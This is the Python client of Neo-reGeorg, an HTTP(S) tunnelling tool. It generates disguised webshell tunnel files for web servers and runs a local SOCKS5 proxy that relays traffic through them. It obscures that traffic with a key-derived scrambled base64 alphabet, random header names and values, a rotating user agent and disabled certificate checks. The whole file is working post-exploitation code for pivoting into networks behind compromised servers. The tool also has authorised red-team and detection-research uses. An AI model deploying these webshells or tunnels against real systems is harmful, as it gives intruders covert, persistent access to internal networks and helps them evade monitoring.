#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__  = 'L'
__version__ = '3.0.0'

import sys
import os
import re
import base64
import struct
import random
import hashlib
import logging
import argparse
import requests
import uuid
import codecs
from time import sleep, time, mktime
from datetime import datetime
from socket import *
from itertools import chain
from threading import Thread

requests.packages.urllib3.disable_warnings()

ROOT = os.path.dirname(os.path.realpath(__file__))

ispython3 = True if sys.version_info >= (3, 0) else False

# Constants
SOCKTIMEOUT       = 5
VER               = b"\x05"
METHOD            = b"\x00"
SUCCESS           = b"\x00"
REFUSED           = b"\x05"
#SOCKFAIL         = b"\x01"
#NETWORKFAIL      = b"\x02"
#HOSTFAIL         = b"\x04"
#TTLEXPIRED       = b"\x06"
#UNSUPPORTCMD     = b"\x07"
#ADDRTYPEUNSPPORT = b"\x08"
#UNASSIGNED       = b"\x09"

# Globals
READBUFSIZE   = 1024
MAXTHERADS    = 1000
READINTERVAL  = 300
WRITEINTERVAL = 200

# Logging
RESET_SEQ = "\033[0m"
COLOR_SEQ = "\033[1;%dm"
BOLD_SEQ  = "\033[1m"

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

# CRITICAL > ERROR > WARNING > INFO > DEBUG > NOTSET
LEVEL = [
    ('ERROR', logging.ERROR),
    ('WARNING', logging.WARNING),
    ('INFO', logging.INFO),
    ('DEBUG', logging.DEBUG),
]

COLORS = {
    'WARNING':  YELLOW,
    'INFO':     WHITE,
    'DEBUG':    BLUE,
    'CRITICAL': YELLOW,
    'ERROR':    RED,
    'RED':      RED,
    'GREEN':    GREEN,
    'YELLOW':   YELLOW,
    'BLUE':     BLUE,
    'MAGENTA':  MAGENTA,
    'CYAN':     CYAN,
    'WHITE':    WHITE,
}


def formatter_message(message, use_color=True):
    if use_color:
        message = message.replace("$RESET", RESET_SEQ).replace("$BOLD", BOLD_SEQ)
    else:
        message = message.replace("$RESET", "").replace("$BOLD", "")
    return message


class ColoredFormatter(logging.Formatter):
    def __init__(self, msg, use_color=True):
        logging.Formatter.__init__(self, msg)
        self.use_color = use_color

    def format(self, record):
        levelname = record.levelname
        if self.use_color and levelname in COLORS:
            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ
            record.levelname = levelname_color
        return logging.Formatter.format(self, record)


class ColoredLogger(logging.Logger):

    def __init__(self, name):
        use_color = not sys.platform.startswith('win')
        FORMAT = "[$BOLD%(levelname)-19s$RESET]  %(message)s"
        COLOR_FORMAT = formatter_message(FORMAT, use_color)
        logging.Logger.__init__(self, name, 'INFO')
        if (name == "transfer"):
            COLOR_FORMAT = "\x1b[80D\x1b[1A\x1b[K%s" % COLOR_FORMAT
        color_formatter = ColoredFormatter(COLOR_FORMAT, use_color)
        console = logging.StreamHandler()
        console.setFormatter(color_formatter)
        self.addHandler(console)


logging.setLoggerClass(ColoredLogger)
log = logging.getLogger(__name__)
transferLog = logging.getLogger("transfer")


class SocksCmdNotImplemented(Exception):
    pass

class Rand:
    def __init__(self, key):
        n = int(hashlib.sha512(key.encode()).hexdigest(), 16)
        self.k_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.v_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
        self.k_clen = len(self.k_clist)
        self.v_clen = len(self.v_clist)
        random.seed(n)

    def header_key(self):
        str_len = random.getrandbits(4) + 2 # len 2 to 17
        return ''.join([ self.k_clist[random.getrandbits(10) % self.k_clen] for _ in range(str_len) ]).capitalize()

    def header_value(self):
        str_len = random.getrandbits(6) + 2 # len 2 to 65
        return ''.join([ self.v_clist[random.getrandbits(10) % self.v_clen] for _ in range(str_len) ])

    def base64_chars(self, charslist):
        if sys.version_info >= (3, 2):
            newshuffle = random.shuffle
        else:
            try:
                xrange
            except NameError:
                xrange = range
            def newshuffle(x):
                def _randbelow(n):
                    getrandbits = random.getrandbits
                    k = n.bit_length()
                    r = getrandbits(k)
                    while r >= n:
                        r = getrandbits(k)
                    return r

                for i in xrange(len(x) - 1, 0, -1):
                    j = _randbelow(i+1)
                    x[i], x[j] = x[j], x[i]

        newshuffle(charslist)


class session(Thread):
    def __init__(self, conn, pSocket, connectURLs, redirectURLs, FwdTarget):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectURLs = connectURLs
        self.redirectURLs = redirectURLs
        self.conn = conn
        self.connect_closed = False
        self.session_connected = False
        self.fwd_target = FwdTarget

    def url_sample(self):
        return random.choice(self.connectURLs)

    def redirect_url_sample(self):
        return random.choice(self.redirectURLs)

    def headerupdate(self, headers):
        headers.update(HEADERS)
        if self.redirectURLs:
            headers[K['X-REDIRECTURL']] = self.redirect_url_sample()

    def session_mark(self):
        mark = base64.b64encode(uuid.uuid4().bytes)[0:-2]
        if ispython3:
            mark = mark.decode()
        mark = mark.replace('+', ' ').replace('/', '_')
        mark = re.sub('^[ _]| $', 'L', mark) # Invalid return character or leading space in header
        return mark

    def parseSocks5(self, sock):
        log.debug("SocksVersion5 detected")
        nmethods = sock.recv(1)
        methods = sock.recv(ord(nmethods))
        sock.sendall(VER + METHOD)
        ver = sock.recv(1)
        if ver == b"\x02":                # this is a hack for proxychains
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp == b"\x01":      # IPv4
            target = sock.recv(4)
            targetPort = sock.recv(2)
            target = inet_ntoa(target)
        elif atyp == b"\x03":             # Hostname
            targetLen = ord(sock.recv(1)) # hostname length (1 byte)
            target = sock.recv(targetLen)
            targetPort = sock.recv(2)
            if LOCALDNS:
                try:
                    target = gethostbyname(target)
                except:
                    log.error("DNS resolution failed(%s)" % target.decode())
                    return False
            else:
                target = target.decode()
        elif atyp == b"\x04":    # IPv6
            target = sock.recv(16)
            targetPort = sock.recv(2)
            target = inet_ntop(AF_INET6, target)

        if targetPort == None:
            return False

        targetPortNum = struct.unpack('>H', targetPort)[0]

        if cmd == b"\x02":   # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd == b"\x03": # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd == b"\x01": # CONNECT
            try:
                serverIp = inet_aton(target)
            except:
                # Forged temporary address 127.0.0.1
                serverIp = inet_aton('127.0.0.1')
            mark = self.setupRemoteSession(target, targetPortNum)
            if mark:
                sock.sendall(VER + SUCCESS + b"\x00" + b"\x01" + serverIp + targetPort)
                return True
            else:
                sock.sendall(VER + REFUSED + b"\x00" + b"\x01" + serverIp + targetPort)
                return False

        raise SocksCmdNotImplemented("Socks5 - Unknown CMD")

    def handleSocks(self, sock):
        try:
            ver = sock.recv(1)
            if ver == b"\x05":
                res = self.parseSocks5(sock)
                if not res:
                    sock.close()
                return res
            elif ver == b'':
                log.warning("[SOCKS] Failed to get version")
            else:
                log.error("Only support Socks5 protocol")
                return False
        except OSError:
            return False
        except timeout:
            return False

    def handleFwd(self, sock):
        log.debug("Forward detected")
        host, port = self.fwd_target.split(':', 1)
        mark = self.setupRemoteSession(host, int(port))
        return bool(mark)


    def error_log(self, str_format, headers):
        if K['X-ERROR'] in headers:
            message = headers[K["X-ERROR"]]
            if message in rV:
                message = rV[message]
            log.error(str_format.format(repr(message)))

    def encode_target(self, data):
        data = base64.b64encode(data)
        if ispython3:
            data = data.decode()
        return data.translate(EncodeMap)

    def encode_body(self, data):
        data = base64.b64encode(data)
        if ispython3:
            data = data.decode()
        return data.translate(EncodeMap)

    def decode_body(self, data):
        if ispython3:
            data = data.decode()
        return base64.b64decode(data.translate(DecodeMap))

    def setupRemoteSession(self, target, port):
        self.mark = self.session_mark()
        target_data = ("%s|%d" % (target, port)).encode()
        headers = {K["X-CMD"]: self.mark+V["CONNECT"], K["X-TARGET"]: self.encode_target(target_data)}
        self.headerupdate(headers)
        self.target = target
        self.port = port

        if '.php' in self.connectURLs[0]:
            try:
                response = self.conn.get(self.url_sample(), headers=headers, timeout=0.5)
            except:
                log.info("[%s:%d] HTTP [200]: mark [%s]" % (self.target, self.port, self.mark))
                return self.mark
        else:
            response = self.conn.get(self.url_sample(), headers=headers)


        rep_headers = response.headers
        if K['X-STATUS'] in rep_headers:
            status = rep_headers[K["X-STATUS"]]
            if status == V["OK"]:
                log.info("[%s:%d] Session mark [%s]" % (self.target, self.port, self.mark))
                return self.mark
            else:
                self.error_log('[CONNECT] [%s:%d] ERROR: {}' % (self.target, self.port), rep_headers)
                return False
        else:
            log.critical('Bad KEY or non-neoreg server')
            return False

    def closeRemoteSession(self):
        try:
            if not self.connect_closed:
                self.connect_closed = True
                try:
                    self.pSocket.close()
                    log.debug("[%s:%d] Closing localsocket" % (self.target, self.port))
                except:
                    if hasattr(self, 'target'):
                        log.debug("[%s:%d] Localsocket already closed" % (self.target, self.port))

                if hasattr(self, 'mark'):
                    headers = {K["X-CMD"]: self.mark+V["DISCONNECT"]}
                    self.headerupdate(headers)
                    response = self.conn.get(self.url_sample(), headers=headers)
                if not self.connect_closed:
                    if hasattr(self, 'target'):
                        log.info("[DISCONNECT] [%s:%d] Connection Terminated" % (self.target, self.port))
                    else:
                        log.error("[DISCONNECT] Can't find target")
        except requests.exceptions.ConnectionError as e:
            log.warning('[requests.exceptions.ConnectionError] {}'.format(e))

    def reader(self):
        try:
            headers = {K["X-CMD"]: self.mark+V["READ"]}
            self.headerupdate(headers)
            n = 0
            while True:
                try:
                    if self.connect_closed or self.pSocket.fileno() == -1:
                        break
                    response = self.conn.get(self.url_sample(), headers=headers)
                    rep_headers = response.headers
                    if K['X-STATUS'] in rep_headers:
                        status = rep_headers[K["X-STATUS"]]
                        if status == V["OK"]:
                            data = response.content
                            if len(data) == 0:
                                sleep(READINTERVAL)
                                continue
                            else:
                                data = self.decode_body(data)
                        else:
                            msg = "[READ] [%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
                            self.error_log(msg, rep_headers)
                            break
                    else:
                        log.error("[READ] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                        break

                    if len(data) > 0:
                        n += 1
                        transferLog.info("[%s:%d] (%d)<<<< [%d]" % (self.target, self.port, n, len(data)))
                        self.pSocket.send(data)
                        if len(data) < 500:
                            sleep(READINTERVAL)

                except error: # python2 socket.send error
                    pass
                except requests.exceptions.ConnectionError as e:
                    log.warning('[requests.exceptions.ConnectionError] {}'.format(e))
                except requests.exceptions.ChunkedEncodingError as e: # python2 requests error
                    log.warning('[requests.exceptions.ChunkedEncodingError] {}'.format(e))
                except Exception as ex:
                    raise ex
        finally:
            self.closeRemoteSession()

    def writer(self):
        try:
            headers = {K["X-CMD"]: self.mark+V["FORWARD"]}
            self.headerupdate(headers)
            n = 0
            while True:
                try:
                    raw_data = self.pSocket.recv(READBUFSIZE)
                    if not raw_data:
                        break
                    data = self.encode_body(raw_data)
                    response = self.conn.post(self.url_sample(), headers=headers, data=data)
                    rep_headers = response.headers
                    if K['X-STATUS'] in rep_headers:
                        status = rep_headers[K["X-STATUS"]]
                        if status != V["OK"]:
                            msg = "[FORWARD] [%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
                            self.error_log(msg, rep_headers)
                            break
                    else:
                        log.error("[FORWARD] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                        break
                    n += 1
                    transferLog.info("[%s:%d] (%d)>>>> [%d]" % (self.target, self.port, n, len(data)))
                    if len(raw_data) < READBUFSIZE:
                        sleep(WRITEINTERVAL)
                except timeout:
                    continue
                except error:
                    break
                except OSError:
                    break
                except requests.exceptions.ConnectionError as e: # python2 socket.send error
                    log.error('[requests.exceptions.ConnectionError] {}'.format(e))
                    break
                except Exception as ex:
                    raise ex
                    break
        finally:
            self.closeRemoteSession()

    def run(self):
        try:
            if self.fwd_target:
                self.session_connected = self.handleFwd(self.pSocket)
            else:
                self.session_connected = self.handleSocks(self.pSocket)

            if self.session_connected:
                log.debug("Staring reader")
                r = Thread(target=self.reader)
                r.start()
                log.debug("Staring writer")
                w = Thread(target=self.writer)
                w.start()
                r.join()
                w.join()
        except SocksCmdNotImplemented as si:
            log.error('[SocksCmdNotImplemented] {}'.format(si))
        except requests.exceptions.ConnectionError as e:
            log.warning('[requests.exceptions.ConnectionError] {}'.format(e))
        except Exception as e:
            log.error('[RUN] {}'.format(e))
            raise e
        finally:
            if self.session_connected:
                self.closeRemoteSession()


def askGeorg(conn, connectURLs, redirectURLs):
    # only check first
    log.info("Checking if Georg is ready")
    headers = {}
    headers.update(HEADERS)

    if redirectURLs:
        headers[K['X-REDIRECTURL']] = redirectURLs[0]

    if INIT_COOKIE:
        headers['Cookie'] = INIT_COOKIE

    need_exit = False
    try:
        response = conn.get(connectURLs[0], headers=headers, timeout=10)
        if '.php' in connectURLs[0]:
            if 'Expires' in response.headers:
                expires = response.headers['Expires']
                try:
                    expires_date = datetime.strptime(expires, '%a, %d %b %Y %H:%M:%S %Z')
                    if mktime(expires_date.timetuple()) < time():
                        log.warning('Server Session expired')
                        if 'Set-Cookie' in response.headers:
                            cookie = ''
                            for k, v in response.cookies.items():
                                cookie += '{}={};'.format(k, v)
                            HEADERS.update({'Cookie' : cookie})
                            log.warning("Automatically append Cookies: {}".format(cookie))
                        else:
                            log.error('There is no valid cookie return')
                            need_exit = True
                except ValueError:
                    log.warning('Expires wrong format: {}'.format(expires))
    except:
        log.error("Georg is not ready, please check URL.")
        exit()

    if need_exit:
        exit()

    if redirectURLs and response.status_code >= 400:
        log.warning('Using redirection will affect performance when the response code >= 400')

    if BASICCHECKSTRING == response.content.strip():
        log.info("Georg says, 'All seems fine'")
        return True
    else:
        if args.skip:
            log.debug("Ignore detecting that Georg is ready")

        else:
            if K['X-ERROR'] in response.headers:
                message = response.headers[K["X-ERROR"]]
                if message in rV:
                    message = rV[message]
                log.error("Georg is not ready. Error message: %s" % message)
            else:
                log.warning('Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
                log.warning('Real Response: {}'.format(response.content.strip()[0:100]))
                log.error("Georg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
                log.error("You can set the `--skip` parameter to ignore errors")
            exit()


def choice_useragent():
    user_agents = [
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
       "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11",
       "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0"
    ]
    return random.choice(user_agents)


def file_read(filename):
    try:
        with codecs.open(filename, encoding="utf-8") as f:
            return f.read()
    except:
        log.error("Failed to read file: %s" % filename)
        exit()


def file_write(filename, data):
    try:
        with open(filename, 'w') as f:
            f.write(data)
    except:
        log.error("Failed to write file: %s" % filename)
        exit()

banner = r"""

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version {}
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg
""".format(__version__)

use_examples = r"""
                [ Basic Use ]

   ./neoreg.py generate -k <you_password>
   ./neoreg.py -k <you_password> -u <server_url>

               [ Advanced Use ]

   ./neoreg.py generate -k <you_password> --file 404.html
   ./neoreg.py -k <you_password> -u <server_url> \
           --skip --proxy http://127.0.0.1:8080 -vv \
           -H 'Authorization: cm9vdDppcyB0d2VsdmU='

"""

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(banner)
        print(use_examples)
        exit()
    elif len(sys.argv) > 1 and sys.argv[1] == 'generate':
        del sys.argv[1]
        parser = argparse.ArgumentParser(description='Generate neoreg webshell')
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key.")
        parser.add_argument("-o", "--outdir", metavar="DIR", help="Output directory.", default='neoreg_servers')
        parser.add_argument("-f", "--file", metavar="FILE", help="Camouflage html page file")
        parser.add_argument("-c", "--httpcode", metavar="CODE", help="Specify HTTP response code. When using -r, it is recommended to <400. (default: 200)", type=int, default=200)
        parser.add_argument("--read-buff", metavar="Bytes", help="Remote read buffer. (default: 513)", type=int, default=513)
        args = parser.parse_args()
    else:
        parser = argparse.ArgumentParser(description="Socks server for Neoreg HTTP(s) tunneller. DEBUG MODE: -k (debug_all|debug_base64|debug_headers_key|debug_headers_values)")
        parser.add_argument("-u", "--url", metavar="URI", required=True, help="The url containing the tunnel script", action='append')
        parser.add_argument("-r", "--redirect-url", metavar="URL", help="Intranet forwarding the designated server (only jsp(x))", action='append')
        parser.add_argument("-t", "--target", metavar="IP:PORT", help="Network forwarding Target, After setting this parameter, port forwarding will be enabled")
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key")
        parser.add_argument("-l", "--listen-on", metavar="IP", help="The default listening address.(default: 127.0.0.1)", default="127.0.0.1")
        parser.add_argument("-p", "--listen-port", metavar="PORT", help="The default listening port.(default: 1080)", type=int, default=1080)
        parser.add_argument("-s", "--skip", help="Skip usability testing", action='store_true')
        parser.add_argument("-H", "--header", metavar="LINE", help="Pass custom header LINE to server", action='append', default=[])
        parser.add_argument("-c", "--cookie", metavar="LINE", help="Custom init cookies")
        parser.add_argument("-x", "--proxy", metavar="LINE", help="Proto://host[:port]  Use proxy on given port", default=None)
        parser.add_argument("--local-dns", help="Use local resolution DNS", action='store_true')
        parser.add_argument("--read-buff", metavar="Bytes", help="Local read buffer, max data to be sent per POST.(default: {} max: 2600)".format(READBUFSIZE), type=int, default=READBUFSIZE)
        parser.add_argument("--read-interval", metavar="MS", help="Read data interval in milliseconds.(default: {})".format(READINTERVAL), type=int, default=READINTERVAL)
        parser.add_argument("--write-interval", metavar="MS", help="Write data interval in milliseconds.(default: {})".format(WRITEINTERVAL), type=int, default=WRITEINTERVAL)
        parser.add_argument("--max-threads", metavar="N", help="Proxy max threads.(default: 1000)", type=int, default=MAXTHERADS)
        parser.add_argument("-v", help="Increase verbosity level (use -vv or more for greater effect)", action='count', default=0)
        args = parser.parse_args()

    rand = Rand(args.key)

    BASE64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    if args.key in ['debug_all', 'debug_base64']:
        M_BASE64CHARS = BASE64CHARS
    else:
        M_BASE64CHARS = list(BASE64CHARS)
        rand.base64_chars(M_BASE64CHARS)
        M_BASE64CHARS = ''.join(M_BASE64CHARS)

    if ispython3:
        maketrans = str.maketrans
    else:
        from string import maketrans

    EncodeMap = maketrans(BASE64CHARS, M_BASE64CHARS)
    DecodeMap = maketrans(M_BASE64CHARS, BASE64CHARS)

    BASICCHECKSTRING = ('<!-- ' + rand.header_value() + ' -->').encode()

    K = {}
    for name in ["X-STATUS", "X-ERROR", "X-CMD", "X-TARGET", "X-REDIRECTURL"]:
        if args.key in ['debug_all', 'debug_headers_key']:
            K[name] = name
        else:
            K[name] = rand.header_key()

    V = {}
    rV = {}
    for name in ["FAIL", "Failed creating socket", "Failed connecting to target", "OK", "Failed writing socket",
            "CONNECT", "DISCONNECT", "READ", "FORWARD", "Failed reading from socket", "No more running, close now",
            "POST request read filed", "Intranet forwarding failed"]:
        if args.key in ['debug_all', 'debug_headers_value']:
            V[name] = name
            rV[name] = name
        else:
            value = rand.header_value()
            V[name] = value
            rV[value] = name

    if 'url' in args:
        # neoreg connect
        if args.v > 2:
            args.v = 2

        LOCALDNS = args.local_dns

        LEVELNAME, LEVELLOG = LEVEL[args.v]
        log.setLevel(LEVELLOG)
        transferLog.setLevel(LEVELLOG)
        separation = "+" + "-" * 72 + "+"
        print(banner)
        print(separation)
        print("  Log Level set to [%s]" % LEVELNAME)

        USERAGENT = choice_useragent()

        urls = args.url
        redirect_urls = []

        HEADERS = {}
        if args.redirect_url:
            for url in args.redirect_url:
                data = base64.b64encode(url.encode())
                if ispython3:
                    data = data.decode()
                redirect_urls.append( data.translate(EncodeMap) )

        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                HEADERS[key.strip()] = value.strip()
            else:
                print("\nError parameter: -H %s" % header)
                exit()

        INIT_COOKIE = args.cookie
        PROXY = { 'http': args.proxy, 'https': args.proxy } if args.proxy else None

        if args.target:
            if not re.match(r'[^:]+:\d+', args.target):
                print("[!] Target parameter error: {}".format(args.target))
                exit()
            print("  Starting Forward [%s:%d] => [%s]" % (args.listen_on, args.listen_port, args.target))
        else:
            print("  Starting SOCKS5 server [%s:%d]" % (args.listen_on, args.listen_port))


        print("  Tunnel at:")
        for url in urls:
            print("    "+url)

        if args.proxy:
            print("  Client Proxy:\n    "+ args.proxy)

        if redirect_urls:
            print("  Redirect to:")
            for url in args.redirect_url:
                print("    "+url)

        print(separation)
        try:
            conn = requests.Session()
            conn.proxies = PROXY
            conn.verify = False
            conn.headers['Accept-Encoding'] = 'gzip, deflate'
            conn.headers['User-Agent'] = USERAGENT

            servSock_start = False
            askGeorg(conn, urls, redirect_urls)

            READBUFSIZE  = min(args.read_buff, 2600)
            MAXTHERADS   = args.max_threads
            READINTERVAL = args.read_interval / 1000.0
            WRITEINTERVAL = args.write_interval / 1000.0

            try:
                servSock = socket(AF_INET, SOCK_STREAM)
                servSock_start = True
                servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                servSock.bind((args.listen_on, args.listen_port))
                servSock.listen(MAXTHERADS)
            except Exception as e:
                log.error("[Server Listen] {}".format(e))
                exit()


            while True:
                try:
                    sock, addr_info = servSock.accept()
                    sock.settimeout(SOCKTIMEOUT)
                    log.debug("Incomming connection")
                    session(conn, sock, urls, redirect_urls, args.target).start()
                except KeyboardInterrupt as ex:
                    break
                except timeout:
                    log.warning("[Socks Connect Tiemout] {}".format(addr_info))
                    if sock:
                        sock.close()
                except OSError:
                    if sock:
                        sock.close()
                except error:
                    pass
                except Exception as e:
                    log.error(e)
                    raise e
        except requests.exceptions.ProxyError:
            log.error("Unable to connect proxy: %s" % args.proxy)
        except requests.exceptions.ConnectionError:
            log.error("Can not connect to the server")
        finally:
            if servSock_start:
                servSock.close()
    else:
        # neoreg server generate
        print(banner)
        MAXREADBUFF = args.read_buff - (args.read_buff % 3)
        outdir = args.outdir
        if not os.path.isdir(outdir):
            os.mkdir(outdir)
            print('    [+] Mkdir a directory: %s' % outdir)

        keyfile = os.path.join(outdir, 'key.txt')
        file_write(keyfile, args.key)

        M_BASE64ARRAY = []
        for i in range(128):
            if chr(i) in BASE64CHARS:
                num = M_BASE64CHARS.index(chr(i))
                M_BASE64ARRAY.append(num)
            else:
                M_BASE64ARRAY.append(-1)

        script_dir = os.path.join(ROOT, 'templates')
        print("    [+] Create neoreg server files:")

        if args.file:
            http_get_content = repr(file_read(args.file)).replace("\\'", "'").replace('"', '\\"')[1:-1]
            http_get_content, n = re.subn(r'\\[xX][a-fA-F0-9]{2}', '', http_get_content)
            if n > 0:
                print("    [*] %d invisible strings were deleted" % n)
        else:
            http_get_content = BASICCHECKSTRING.decode()

        for filename in os.listdir(script_dir):
            outfile = os.path.join(outdir, filename)
            filepath = os.path.join(script_dir, filename)
            if os.path.isfile(filepath) and filename.startswith('tunnel.'):
                text = file_read(filepath)
                text = text.replace(r"Georg says, 'All seems fine'", http_get_content)
                text = re.sub(r"BASE64 CHARSLIST", M_BASE64CHARS, text)

                # only jsp
                text = re.sub(r"BASE64 ARRAYLIST", ','.join(map(str, M_BASE64ARRAY)), text)

                text = re.sub(r"\b513\b", str(MAXREADBUFF), text)

                for k, v in chain(K.items(), V.items()):
                    text = re.sub(r'\b%s\b' % k, v, text)

                text = re.sub(r"\bHTTPCODE\b", str(args.httpcode), text)

                file_write(outfile, text)
                print("       => %s/%s" % (outdir, os.path.basename(outfile)))

                # jsp/jspx trimDirectiveWhitespaces=true
                if filename.endswith(('.jsp', '.jspx')):
                    text = text.replace(' trimDirectiveWhitespaces="true"', '')
                    outfile = os.path.join(outdir, filename.replace('tunnel.', 'tunnel_compatibility.'))
                    file_write(outfile, text)
                    print("       => %s/%s" % (outdir, os.path.basename(outfile)))
        print('')
